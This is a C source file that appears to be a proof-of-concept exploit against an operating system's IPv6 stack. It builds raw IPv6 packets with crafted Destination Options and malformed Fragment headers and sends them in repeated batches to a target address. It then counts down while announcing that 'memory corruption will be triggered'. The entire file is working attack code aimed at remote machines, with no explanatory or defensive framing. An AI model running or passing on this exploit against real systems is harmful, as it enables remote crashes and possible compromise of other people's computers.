#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <net/ethernet.h> 
#include <linux/if_packet.h>
#include <net/if.h>
#include <time.h>
#include <getopt.h>

#define MAX_PACKET_SIZE 1024

struct ipv6_header {
    uint32_t ver_tc_fl;
    uint16_t payload_len;
    uint8_t next_header;
    uint8_t hop_limit;
    struct in6_addr src_addr;
    struct in6_addr dst_addr;
};

struct dest_opt_header {
    uint8_t next_header;
    uint8_t hdr_ext_len;
    uint8_t opt_type;
    uint8_t opt_len;
    char opt_data[3];
};

struct frag_header {
    uint8_t next_header;
    uint8_t reserved;
    uint16_t frag_off_flags;
    uint32_t id;
};

struct ethernet_header {
    unsigned char dst_mac[6];
    unsigned char src_mac[6];
    uint16_t ether_type;
};

static void create_ipv6_packet(void *packet, const char *dst_ip, uint8_t hlim,
                               uint32_t frag_id, int packet_type, const char *mac_addr)
{
    struct ipv6_header *ip_hdr;
    void *payload;
    uint16_t payload_len = 0;

    if (mac_addr) {
        struct ethernet_header *eth_hdr = (struct ethernet_header *)packet;
        sscanf(mac_addr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &eth_hdr->dst_mac[0], &eth_hdr->dst_mac[1], &eth_hdr->dst_mac[2],
               &eth_hdr->dst_mac[3], &eth_hdr->dst_mac[4], &eth_hdr->dst_mac[5]);
        memset(eth_hdr->src_mac, 0, 6);
        eth_hdr->ether_type = htons(0x86DD);  // IPv6
        ip_hdr = (struct ipv6_header *)(packet + sizeof(struct ethernet_header));
        payload = packet + sizeof(struct ethernet_header) + sizeof(struct ipv6_header);
    } else {
        ip_hdr = (struct ipv6_header *)packet;
        payload = packet + sizeof(struct ipv6_header);
    }

    /* IPv6 header */
    ip_hdr->ver_tc_fl = htonl((6 << 28) | 1);  // Version 6, Flow Label 1
    ip_hdr->hop_limit = hlim;
    inet_pton(AF_INET6, dst_ip, &ip_hdr->dst_addr);

    if (packet_type == 1) {  /* Destination Options Header */
        struct dest_opt_header *doh = (struct dest_opt_header *)payload;
        ip_hdr->next_header = 60;
        doh->next_header = 59;
        doh->hdr_ext_len = 0;
        doh->opt_type = 0x81;
        doh->opt_len = 3;
        memset(doh->opt_data, 'a', 3);
        payload_len = sizeof(struct dest_opt_header);
    } else {  /* Fragment Header */
        struct frag_header *fh = (struct frag_header *)payload;
        ip_hdr->next_header = 44;
        fh->next_header = 59;
        fh->reserved = 0;
        fh->id = htonl(frag_id);
        if (packet_type == 2) {  /* with data */
            fh->frag_off_flags = htons(0x1);
            memcpy(payload + sizeof(struct frag_header), "aaaaaaaa", 8);
            payload_len = sizeof(struct frag_header) + 8;
        } else {  /* without data */
            fh->frag_off_flags = htons(8);
            payload_len = sizeof(struct frag_header);
        }
    }

    ip_hdr->payload_len = htons(payload_len);
}

static int send_packets(const char *interface, const char *ip_addr, 
                        const char *mac_addr, int num_tries, int num_batches)
{
    int sockfd, packets_sent = 0;
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in6 dst_addr;
    struct sockaddr_ll ll_addr;

    if (mac_addr) {
        sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
        if (sockfd < 0) {
            perror("socket creation failed");
            return -1;
        }

        memset(&ll_addr, 0, sizeof(ll_addr));
        ll_addr.sll_family = AF_PACKET;
        ll_addr.sll_ifindex = if_nametoindex(interface);
        ll_addr.sll_halen = ETH_ALEN;
    } else {
        sockfd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
        if (sockfd < 0) {
            perror("socket creation failed");
            return -1;
        }

        memset(&dst_addr, 0, sizeof(dst_addr));
        dst_addr.sin6_family = AF_INET6;
        inet_pton(AF_INET6, ip_addr, &dst_addr.sin6_addr);
    }

    for (int batch = 0; batch < num_batches; batch++) {
        for (int i = 0; i < num_tries; i++) {
            uint32_t frag_id = 0xdebac1e + i;
            for (int packet_type = 1; packet_type <= 3; packet_type++) {
                create_ipv6_packet(packet, ip_addr, 64 + i, frag_id, packet_type, mac_addr);

                for (int j = 0; j < 2; j++) {
                    ssize_t sent;
                    if (mac_addr) {
                        sent = sendto(sockfd, packet,
                                      sizeof(struct ethernet_header) +
                                      sizeof(struct ipv6_header) +
                                      ntohs(((struct ipv6_header *)(packet + sizeof(struct ethernet_header)))->payload_len),
                                      0, (struct sockaddr *)&ll_addr, sizeof(ll_addr));
                    } else {
                        sent = sendto(sockfd, packet,
                                      sizeof(struct ipv6_header) +
                                      ntohs(((struct ipv6_header *)packet)->payload_len),
                                      0, (struct sockaddr *)&dst_addr, sizeof(dst_addr));
                    }
                    if (sent < 0) {
                        perror("sendto failed");
                        close(sockfd);
                        return -1;
                    }
                    packets_sent++;
                }
            }
        }
    }

    close(sockfd);
    return packets_sent;
}

int main(int argc, char *argv[])
{
    char *interface = NULL;
    char *ip_addr = NULL;
    char *mac_addr = NULL;
    int num_tries = 20;
    int num_batches = 20;
    int opt;

    while ((opt = getopt(argc, argv, "i:a:m:t:b:")) != -1) {
        switch (opt) {
        case 'i':
            interface = optarg;
            break;
        case 'a':
            ip_addr = optarg;
            break;
        case 'm':
            mac_addr = optarg;
            break;
        case 't':
            num_tries = atoi(optarg);
            break;
        case 'b':
            num_batches = atoi(optarg);
            break;
        default:
            fprintf(stderr, "Usage: %s -i <interface> -a <ipv6_address> [-m <mac_address>] [-t <num_tries>] [-b <num_batches>]\n", argv[0]);
            return 1;
        }
    }

    if (!interface || !ip_addr) {
        fprintf(stderr, "Interface and IPv6 address are required.\n");
        fprintf(stderr, "Usage: %s -i <interface> -a <ipv6_address> [-m <mac_address>] [-t <num_tries>] [-b <num_batches>]\n", argv[0]);
        return 1;
    }

    printf("Sending packets\n");
    int packets_sent = send_packets(interface, ip_addr, mac_addr, num_tries, num_batches);

    if (packets_sent < 0) {
        fprintf(stderr, "Error sending packets\n");
        return 1;
    }

    printf("Sent %d packets\n", packets_sent);

    for (int i = 60; i > 0; i--) {
        printf("\rMemory corruption will be triggered in %d seconds", i);
        fflush(stdout);
        sleep(1);
    }

    printf("\nDone\n");
    return 0;
}